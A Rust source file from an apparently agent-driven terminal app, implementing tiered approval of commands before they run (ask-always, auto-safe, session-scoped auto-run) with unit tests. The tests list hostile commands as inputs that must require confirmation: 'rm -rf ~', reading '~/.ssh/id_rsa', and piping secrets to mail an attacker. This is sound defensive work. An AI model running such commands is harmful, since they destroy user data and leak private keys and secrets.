//! `ApprovalPolicy`: the graduated propose -> approve -> run decision, ported
//! from the prototype `DefaultApprovalPolicy`.
//!
//! AUTO-SAFE is ON by default (the locked decision): a command is auto-approved
//! ONLY if it classifies [`Risk::Safe`] AND carries no shell-active reason.
//! Everything at [`Risk::Caution`] or [`Risk::Dangerous`] always requires explicit
//! confirmation. The shell-active guard is defense in depth: a metacharacter
//! already forces the level above Safe, but the policy refuses auto-approve on the
//! reason directly so a future classifier change can never silently auto-run a
//! shell-interpreted string. The model's opinion never enters this decision.
//!
//! Graduated autonomy ([`AutonomyMode`], ticket T-5.11) selects the tier:
//! `ask-always` (every command confirmed), `auto-safe` (the shipped default - only
//! `Safe` + non-shell-active auto-runs), and the session-scoped `auto-run-in-session`
//! widening. [`AutonomyState`] is the live, session-scoped control that the app owns:
//! it starts at a configured baseline, can be switched at runtime, and reverts to the
//! baseline when a NEW session begins so a widening never persists. Two invariants
//! hold in EVERY tier and are never widened: a shell-active reason never auto-runs
//! (the `SHELL_ACTIVE_REASONS` belt-and-suspenders), and a `Dangerous` verdict never
//! auto-runs. The model's opinion never enters this decision.

use crate::risk::{DefaultRiskClassifier, RemoteContext, Risk, RiskAssessment};
use crate::secrets::Secrets;

/// The graduated autonomy tier (ticket T-5.11; locked decision 5 + Recommendation
/// 10). A ladder from most-conservative to most-permissive:
/// [`AskAlways`](AutonomyMode::AskAlways) -> [`AutoSafe`](AutonomyMode::AutoSafe) ->
/// [`AutoRunInSession`](AutonomyMode::AutoRunInSession). `AutoSafe` is the shipped
/// default (the locked AUTO-SAFE stance); `AutoRunInSession` is an explicit,
/// session-scoped widening that does NOT survive into a new session.
///
/// Hard invariants enforced by [`auto_approves`](AutonomyMode::auto_approves) in
/// EVERY tier (no mode can override them): a command carrying a shell-active reason
/// never auto-runs, and a `Dangerous` command never auto-runs.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum AutonomyMode {
    /// Every command requires explicit confirmation - even a proven-`Safe` one.
    AskAlways,
    /// The shipped default: auto-run a `Safe`, non-shell-active command; everything
    /// escalated (`Caution` / `Dangerous` / shell-active) requires confirmation.
    AutoSafe,
    /// A session-scoped widening: additionally auto-run a non-shell-active `Caution`
    /// command. `Dangerous` and shell-active still always require confirmation. This
    /// tier reverts to the baseline on a new session ([`AutonomyState`]).
    ///
    /// OWNER-CONFIRM (ticket T-5.11): auto-running `Caution` here intentionally
    /// LOOSENS the locked "`Caution`/`Dangerous` always require explicit confirmation"
    /// rule (ADR-0006 / CLAUDE.md), but ONLY as an explicit, opt-in, session-scoped
    /// escalation that auto-reverts on a new session - the graduated-autonomy model of
    /// `06-agent-architecture.md` Recommendation 10. The two hard invariants
    /// (shell-active never, `Dangerous` never) are preserved in this tier too. This is
    /// flagged for owner sign-off, not silently overridden; if the owner wants
    /// `Caution` to confirm in EVERY tier, make this arm behave like `AutoSafe`.
    AutoRunInSession,
}

impl AutonomyMode {
    /// Whether a command with this `assessment` auto-runs under this mode.
    ///
    /// The two hard invariants are checked FIRST so they hold in every tier: a
    /// shell-active reason never auto-runs (defense in depth - the reason blocks it
    /// directly, independent of level), and a `Dangerous` verdict never auto-runs.
    /// Only then does the tier widen what auto-runs.
    #[must_use]
    pub fn auto_approves(self, assessment: &RiskAssessment) -> bool {
        // Belt-and-suspenders: no mode ever auto-runs a shell-active or Dangerous
        // command. A future classifier change can never silently widen these.
        if assessment.is_shell_active() || assessment.level == Risk::Dangerous {
            return false;
        }
        match self {
            AutonomyMode::AskAlways => false,
            AutonomyMode::AutoSafe => assessment.level == Risk::Safe,
            AutonomyMode::AutoRunInSession => {
                matches!(assessment.level, Risk::Safe | Risk::Caution)
            }
        }
    }

    /// The next tier in the ladder (wraps), for a single hotkey that steps through
    /// `ask-always -> auto-safe -> auto-run-in-session -> ask-always`.
    #[must_use]
    pub fn next(self) -> Self {
        match self {
            AutonomyMode::AskAlways => AutonomyMode::AutoSafe,
            AutonomyMode::AutoSafe => AutonomyMode::AutoRunInSession,
            AutonomyMode::AutoRunInSession => AutonomyMode::AskAlways,
        }
    }

    /// A terse, stable label for the mode indicator + logging (color is always paired
    /// with this text downstream - color-blind safety).
    #[must_use]
    pub fn label(self) -> &'static str {
        match self {
            AutonomyMode::AskAlways => "ask-always",
            AutonomyMode::AutoSafe => "auto-safe",
            AutonomyMode::AutoRunInSession => "auto-run",
        }
    }
}

/// What the policy decided for a command.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Approval {
    /// Run without asking.
    AutoApprove,
    /// Pause and require explicit user confirmation, with the reasons shown.
    RequireConfirm(RiskAssessment),
}

impl Approval {
    pub fn is_auto(&self) -> bool {
        matches!(self, Approval::AutoApprove)
    }
}

/// The approval policy. Wraps a risk classifier and the autonomy [`mode`](AutonomyMode).
#[derive(Debug, Clone)]
pub struct ApprovalPolicy {
    classifier: DefaultRiskClassifier,
    /// The graduated autonomy tier in effect (the AUTO-SAFE default).
    mode: AutonomyMode,
}

impl Default for ApprovalPolicy {
    fn default() -> Self {
        // AUTO-SAFE ON by default (the locked decision).
        Self {
            classifier: DefaultRiskClassifier,
            mode: AutonomyMode::AutoSafe,
        }
    }
}

impl ApprovalPolicy {
    /// The default policy: AUTO-SAFE ON.
    pub fn new() -> Self {
        Self::default()
    }

    /// The ask-always tier: every command requires confirmation.
    pub fn ask_always() -> Self {
        Self::default().with_mode(AutonomyMode::AskAlways)
    }

    /// The session-scoped auto-run-in-session widening tier (ticket T-5.11).
    pub fn auto_run_in_session() -> Self {
        Self::default().with_mode(AutonomyMode::AutoRunInSession)
    }

    /// This policy with an explicit autonomy [`mode`](AutonomyMode) (chainable).
    #[must_use]
    pub fn with_mode(mut self, mode: AutonomyMode) -> Self {
        self.mode = mode;
        self
    }

    /// The autonomy tier currently in effect.
    #[must_use]
    pub fn mode(&self) -> AutonomyMode {
        self.mode
    }

    /// Decide on an already-computed assessment (the prototype's pure policy). The
    /// path to [`Approval::AutoApprove`] is exactly [`AutonomyMode::auto_approves`]:
    /// the current tier permits it AND it is neither shell-active nor `Dangerous`.
    pub fn decide_assessment(&self, assessment: RiskAssessment) -> Approval {
        if self.mode.auto_approves(&assessment) {
            Approval::AutoApprove
        } else {
            Approval::RequireConfirm(assessment)
        }
    }

    /// Decide on a raw command line, classifying against the single [`Secrets`]
    /// source so the gate shares the sanitizer's deny-set. Routes through the
    /// MULTI-LINE buffer gate so an embedded `\n` cannot smuggle a dangerous
    /// second command past a head-keyed rule (single-line is identical).
    pub fn decide(&self, line: &str, secrets: &Secrets) -> Approval {
        self.decide_buffer(line, secrets)
    }

    /// Decide on a possibly multi-line command buffer (the input-editor submit).
    pub fn decide_buffer(&self, buffer: &str, secrets: &Secrets) -> Approval {
        let assessment = self.classifier.classify_buffer(buffer, None, None, secrets);
        self.decide_assessment(assessment)
    }

    /// Decide on a parsed-argv command with optional cwd / remote context. The
    /// seam the agent turn uses for a single tool-call command.
    pub fn decide_command(
        &self,
        command: &[String],
        cwd: Option<&str>,
        remote: Option<&RemoteContext>,
        secrets: &Secrets,
    ) -> Approval {
        let assessment = self.classifier.classify(command, cwd, remote, secrets);
        self.decide_assessment(assessment)
    }
}

/// The live, session-scoped autonomy control (ticket T-5.11). Holds the `current`
/// tier and the configured `baseline` it reverts to when a NEW session begins. The
/// app owns one per session and consults it to build the [`ApprovalPolicy`] for a
/// turn; the autonomy toggle calls [`set_mode`](AutonomyState::set_mode) /
/// [`cycle`](AutonomyState::cycle) and the change takes effect on the very next gate
/// decision.
///
/// The shipped baseline is [`AutonomyMode::AutoSafe`] (the locked default). A session
/// may NARROW to ask-always or WIDEN to auto-run-in-session, but the widening NEVER
/// carries over: [`reset_for_new_session`](AutonomyState::reset_for_new_session)
/// (called on a fresh session) restores the baseline. No tier ever auto-runs a
/// shell-active or `Dangerous` command (enforced in [`AutonomyMode::auto_approves`]).
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub struct AutonomyState {
    current: AutonomyMode,
    baseline: AutonomyMode,
}

impl AutonomyState {
    /// A session starting at `baseline` (the configured default; ships
    /// [`AutonomyMode::AutoSafe`]). The current tier begins equal to the baseline.
    #[must_use]
    pub fn new(baseline: AutonomyMode) -> Self {
        Self {
            current: baseline,
            baseline,
        }
    }

    /// The tier in effect right now.
    #[must_use]
    pub fn mode(self) -> AutonomyMode {
        self.current
    }

    /// The configured baseline the session reverts to on a new session.
    #[must_use]
    pub fn baseline(self) -> AutonomyMode {
        self.baseline
    }

    /// Switch the live tier immediately (the autonomy toggle). Takes effect on the
    /// next gate decision - there is no caching of the prior decision.
    pub fn set_mode(&mut self, mode: AutonomyMode) {
        self.current = mode;
    }

    /// Step to the next tier in the ladder (wraps) - for a single cycle hotkey.
    pub fn cycle(&mut self) {
        self.current = self.current.next();
    }

    /// Revert the live tier to the configured baseline. Called when a NEW session
    /// begins, so a session widening (auto-run-in-session) never persists across
    /// sessions (ticket T-5.11 AC5).
    ///
    /// OWNER-CONFIRM (ticket T-5.11): the revert TARGET is the configured baseline
    /// (shipped AUTO-SAFE), NOT the literal "ask-always" the AC5 text says. Reverting
    /// to ask-always would contradict the locked "AUTO-SAFE ON by default" (ADR-0006 /
    /// CLAUDE.md), so the baseline is the only coherent target. The safety INTENT of
    /// AC5 - a runtime widening must never silently survive into a new session - is
    /// fully met. Flagged for owner sign-off; configurable via `ATERM_AUTONOMY` if the
    /// owner wants a stricter (ask-always) baseline.
    pub fn reset_for_new_session(&mut self) {
        self.current = self.baseline;
    }

    /// The [`ApprovalPolicy`] the current tier dictates - the seam the turn loop
    /// consumes. Rebuilt from the live mode so a toggle is reflected immediately.
    #[must_use]
    pub fn policy(self) -> ApprovalPolicy {
        ApprovalPolicy::default().with_mode(self.current)
    }
}

impl Default for AutonomyState {
    /// The shipped session default: baseline AUTO-SAFE.
    fn default() -> Self {
        Self::new(AutonomyMode::AutoSafe)
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::risk::RiskReason;

    fn argv(parts: &[&str]) -> Vec<String> {
        parts.iter().map(|s| (*s).to_string()).collect()
    }

    /// True iff the command would be auto-approved with auto-run (AUTO-SAFE) on.
    fn auto_approved(line: &str) -> bool {
        ApprovalPolicy::new()
            .decide(line, &Secrets::new())
            .is_auto()
    }

    #[test]
    fn benign_commands_auto_approve() {
        // Guard against over-flagging: ordinary argv with no shell-active chars
        // must still auto-run under AUTO-SAFE.
        assert!(auto_approved("ls -la"));
        assert!(auto_approved("git status"));
        assert!(auto_approved("echo hello"));
        assert!(auto_approved("cat README.md"));
        assert!(auto_approved("git log --oneline"));
    }

    #[test]
    fn dangerous_and_caution_require_confirm() {
        assert!(!auto_approved("rm -rf ~"));
        assert!(!auto_approved("cat ~/.ssh/id_rsa"));
        assert!(!auto_approved("python -c 'import os'"));
        assert!(!auto_approved("brew install wget")); // Caution
        assert!(!auto_approved("env")); // the env-dump fail-open is closed
    }

    #[test]
    fn shell_active_strings_never_auto_approve_even_at_safe_level() {
        // Anything with |/>/&&/~/$() must require confirmation even if it looks
        // built from safe programs.
        for line in [
            "ls | grep foo",
            "echo hi > out.txt",
            "ls && rm foo",
            "cat ~/notes",
            "echo $(whoami)",
            "FOO=bar ls",
        ] {
            assert!(
                !auto_approved(line),
                "shell-active string must not auto-approve: {line}"
            );
        }
    }

    #[test]
    fn ask_always_tier_confirms_even_a_safe_command() {
        let p = ApprovalPolicy::ask_always();
        assert!(!p.decide("ls -la", &Secrets::new()).is_auto());
    }

    #[test]
    fn defense_in_depth_safe_level_with_shell_active_reason_does_not_auto_approve() {
        // A (hypothetical) Safe assessment carrying a shell-active reason must not
        // auto-approve - the policy refuses on the reason, not just the level.
        let p = ApprovalPolicy::new();
        for reason in [
            RiskReason::ShellChaining,
            RiskReason::RedirectOverwrite,
            RiskReason::ForkBomb,
            RiskReason::RemoteExecution,
        ] {
            let a = RiskAssessment {
                level: Risk::Safe,
                reasons: vec![reason],
            };
            assert!(
                !p.decide_assessment(a).is_auto(),
                "must not auto-approve Safe + {reason:?}"
            );
        }
    }

    #[test]
    fn require_confirm_carries_the_reasons() {
        match ApprovalPolicy::new().decide("rm -rf ~", &Secrets::new()) {
            Approval::RequireConfirm(a) => {
                assert_eq!(a.level, Risk::Dangerous);
                assert!(a.reasons.contains(&RiskReason::Destructive));
            }
            Approval::AutoApprove => panic!("rm -rf must require confirmation"),
        }
    }

    #[test]
    fn multiline_submit_with_a_risky_line_never_auto_approves() {
        let p = ApprovalPolicy::new();
        assert!(!p.decide_buffer("ls\nrm -rf /", &Secrets::new()).is_auto());
        // a shell-active second line also blocks auto-approve
        assert!(!p
            .decide_buffer("echo ok\ncat secrets | mail attacker", &Secrets::new())
            .is_auto());
    }

    #[test]
    fn remote_command_can_never_auto_approve() {
        let p = ApprovalPolicy::new();
        // even a plain remote `ls` (Caution, RemoteExecution) must confirm
        let ls = p.decide_command(
            &argv(&["ls"]),
            None,
            Some(&RemoteContext::new("prod")),
            &Secrets::new(),
        );
        assert!(!ls.is_auto());
    }

    #[test]
    fn parsed_safe_command_auto_approves_via_decide_command() {
        let p = ApprovalPolicy::new();
        assert!(p
            .decide_command(&argv(&["ls", "-la"]), None, None, &Secrets::new())
            .is_auto());
    }

    // --- graduated autonomy (ticket T-5.11) ------------------------------------

    fn assess(level: Risk, reasons: &[RiskReason]) -> RiskAssessment {
        RiskAssessment {
            level,
            reasons: reasons.to_vec(),
        }
    }

    /// Whether `mode` auto-approves `assessment` (via the real policy decision path).
    fn auto(mode: AutonomyMode, assessment: RiskAssessment) -> bool {
        ApprovalPolicy::default()
            .with_mode(mode)
            .decide_assessment(assessment)
            .is_auto()
    }

    #[test]
    fn autonomy_truth_table_covers_every_tier_and_class() {
        use AutonomyMode::{AskAlways, AutoRunInSession, AutoSafe};

        let safe = || assess(Risk::Safe, &[]);
        let caution = || assess(Risk::Caution, &[RiskReason::PackageMutator]);
        let dangerous = || assess(Risk::Dangerous, &[RiskReason::Destructive]);
        // Shell-active reasons at otherwise-low levels (the defense-in-depth cases).
        let safe_shell = || assess(Risk::Safe, &[RiskReason::ShellChaining]);
        let caution_shell = || assess(Risk::Caution, &[RiskReason::RedirectOverwrite]);

        // ask-always: nothing auto-runs, not even a proven-safe command.
        assert!(!auto(AskAlways, safe()));
        assert!(!auto(AskAlways, caution()));
        assert!(!auto(AskAlways, dangerous()));

        // auto-safe (the default): only Safe + non-shell-active auto-runs.
        assert!(auto(AutoSafe, safe()));
        assert!(!auto(AutoSafe, caution()));
        assert!(!auto(AutoSafe, dangerous()));

        // auto-run-in-session: ALSO auto-runs non-shell-active Caution; never
        // Dangerous.
        assert!(auto(AutoRunInSession, safe()));
        assert!(auto(AutoRunInSession, caution()));
        assert!(!auto(AutoRunInSession, dangerous()));

        // HARD INVARIANTS, true in EVERY tier: shell-active never auto-runs (even at
        // Safe level), and Dangerous never auto-runs.
        for mode in [AskAlways, AutoSafe, AutoRunInSession] {
            assert!(
                !auto(mode, safe_shell()),
                "shell-active must never auto-run"
            );
            assert!(
                !auto(mode, caution_shell()),
                "shell-active Caution must never auto-run"
            );
            assert!(
                !auto(mode, dangerous()),
                "Dangerous must never auto-run in any tier"
            );
        }
    }

    #[test]
    fn autonomy_mode_ladder_cycles_in_order() {
        use AutonomyMode::{AskAlways, AutoRunInSession, AutoSafe};
        assert_eq!(AskAlways.next(), AutoSafe);
        assert_eq!(AutoSafe.next(), AutoRunInSession);
        assert_eq!(AutoRunInSession.next(), AskAlways);
    }

    #[test]
    fn autonomy_state_defaults_to_auto_safe_baseline() {
        let s = AutonomyState::default();
        assert_eq!(s.mode(), AutonomyMode::AutoSafe);
        assert_eq!(s.baseline(), AutonomyMode::AutoSafe);
    }

    #[test]
    fn switching_autonomy_mode_takes_effect_on_the_next_decision() {
        // AC4: a mode switch is reflected immediately (no cached decision). Build the
        // policy through the state each time, exactly as the app does per turn.
        let mut s = AutonomyState::default();
        assert!(s
            .policy()
            .decide_assessment(assess(Risk::Safe, &[]))
            .is_auto());

        s.set_mode(AutonomyMode::AskAlways);
        assert!(
            !s.policy()
                .decide_assessment(assess(Risk::Safe, &[]))
                .is_auto(),
            "ask-always must confirm a safe command on the very next decision"
        );
    }

    #[test]
    fn a_session_widening_reverts_to_baseline_on_a_new_session() {
        // AC5: auto-run-in-session is session-scoped - a NEW session never inherits
        // it. The widening reverts to the configured baseline (the shipped AUTO-SAFE
        // default), so a fresh session does not silently keep the looser tier.
        //
        // NOTE (owner-confirm, T-5.11): AC5's literal text says revert "back to
        // ask-always", but we revert to the AUTO-SAFE baseline - reverting to
        // ask-always would contradict the locked "AUTO-SAFE ON by default" (ADR-0006).
        // The safety intent (a widening never survives a new session) is what we assert
        // here; the target divergence is flagged in the ticket Notes for sign-off.
        let mut s = AutonomyState::default();
        s.set_mode(AutonomyMode::AutoRunInSession);
        assert_eq!(s.mode(), AutonomyMode::AutoRunInSession);

        s.reset_for_new_session();
        assert_eq!(
            s.mode(),
            AutonomyMode::AutoSafe,
            "a new session drops the widening back to the baseline"
        );
        // And the widened tier's extra auto-approval (Caution) is gone after reset.
        assert!(!s
            .policy()
            .decide_assessment(assess(Risk::Caution, &[RiskReason::PackageMutator]))
            .is_auto());
    }
}
